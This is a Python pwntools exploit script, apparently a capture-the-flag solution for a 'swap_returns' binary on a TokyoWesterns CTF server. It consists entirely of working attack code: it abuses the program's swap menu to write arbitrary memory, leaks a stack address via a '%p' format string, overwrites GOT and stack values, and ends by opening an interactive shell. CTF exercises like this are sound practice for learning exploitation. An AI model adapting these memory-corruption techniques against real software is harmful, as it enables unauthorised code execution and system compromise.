from pwn import *

#r = process(["./swap_returns"],env={"LD_PRELOAD":"./libc.so.6"})
r = remote("swap.chal.ctf.westerns.tokyo", 37567)

def set_addr(a,b):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(a))
	r.sendlineafter(":",str(b))

def swap_val():
	r.sendlineafter(":","2")

def set_addr2(a,b):
        r.sendafter(":","a")
        r.sendlineafter(":",str(a))
        r.sendlineafter(":",str(b))

def swap_val2():
	r.sendafter(":","aa")


set_addr(0x601050,0x601038)
swap_val()
r.send("%p")
swap_val2()
#r.interactive()
r.recvuntil("0x")
stack = int(r.recvuntil("I")[:-1],16)-6+0x30
print hex(stack)

set_addr2(0x601acb,stack)
swap_val2()
set_addr2(0x601a24,stack)
swap_val2()
#r.send("\x24\xcb")
set_addr2(stack+0x28,0x601d00)
swap_val2()
set_addr2(0x601b02,0x601a24-7)
swap_val2()
set_addr2(0x601b01,0x601acb-7)
swap_val2()
set_addr2(0x60103a,0x601b08-6)
#input(":")
swap_val2()

r.interactive()
